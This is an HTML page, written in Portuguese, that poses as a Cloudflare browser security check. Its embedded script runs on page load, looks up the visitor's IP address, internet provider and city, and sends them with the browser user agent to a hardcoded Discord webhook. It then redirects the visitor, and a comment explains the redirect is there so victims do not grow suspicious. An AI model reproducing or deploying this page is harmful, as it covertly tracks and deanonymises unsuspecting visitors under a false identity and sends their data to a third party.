<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check - Cloudflare</title>
    <style>
        body { background: #0f172a; color: #f1f5f9; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #1e293b; padding: 40px; border-radius: 12px; border: 1px solid #334155; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 300px; }
        .spinner { border: 3px solid #334155; border-top: 3px solid #3b82f6; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .toast { position: fixed; top: 20px; right: 20px; background: #3b82f6; color: white; padding: 12px; border-radius: 6px; font-size: 13px; box-shadow: 0 4px 10px rgba(0,0,0,0.3); z-index: 100; margin-bottom: 10px; border-right: 4px solid #fff; }
    </style>
</head>
<body>

    <div id="notif"></div>

    <div class="card">
        <div class="spinner"></div>
        <h2 style="font-size: 18px; margin: 0;">Verificando Conex√£o</h2>
        <p style="font-size: 13px; color: #94a3b8;">Validando integridade do navegador...</p>
    </div>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1473792549045932103/9BrDwlVARrLj3joN4liqNqY8OmV07hF6hf8KtHwdA1nEr_sbeSq9So8SQlY9DL5weC9q";

        function toast(t) {
            const n = document.createElement('div');
            n.className = 'toast'; n.innerText = '‚Ñπ ' + t;
            document.getElementById('notif').appendChild(n);
            setTimeout(() => n.remove(), 3000);
        }

        async function capturar() {
            toast("Conex√£o Segura");
            
            try {
                // Captura o IP e Provedor (Internet)
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                
                toast("Enviando Logs...");

                // Envia para o Discord
                await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "üì° NOVO LOG DE DISPOSITIVO",
                            color: 3447003,
                            fields: [
                                { name: "üåê IP P√∫blico:", value: data.ip || "N/A", inline: true },
                                { name: "üè¢ Provedor/Internet:", value: data.org || "N/A", inline: false },
                                { name: "üèôÔ∏è Localiza√ß√£o (IP):", value: `${data.city}, ${data.region} - ${data.country_name}`, inline: false },
                                { name: "üì± Aparelho/Browser:", value: navigator.userAgent, inline: false },
                                { name: "‚è∞ Hor√°rio:", value: new Date().toLocaleString('pt-BR'), inline: true }
                            ],
                            footer: { text: "Monitoramento Ativo" }
                        }]
                    })
                });

                toast("Conclu√≠do!");
                // Fecha a aba ou redireciona
                setTimeout(() => { window.location.href = "about:blank"; }, 1000);

            } catch (e) {
                console.error("Erro no envio");
                // Mesmo com erro, redireciona para n√£o suspeitarem
                window.location.href = "https://google.com";
            }
        }

        // Inicia assim que a p√°gina carrega
        window.onload = () => {
            setTimeout(capturar, 500);
        };
    </script>
</body>
</html>
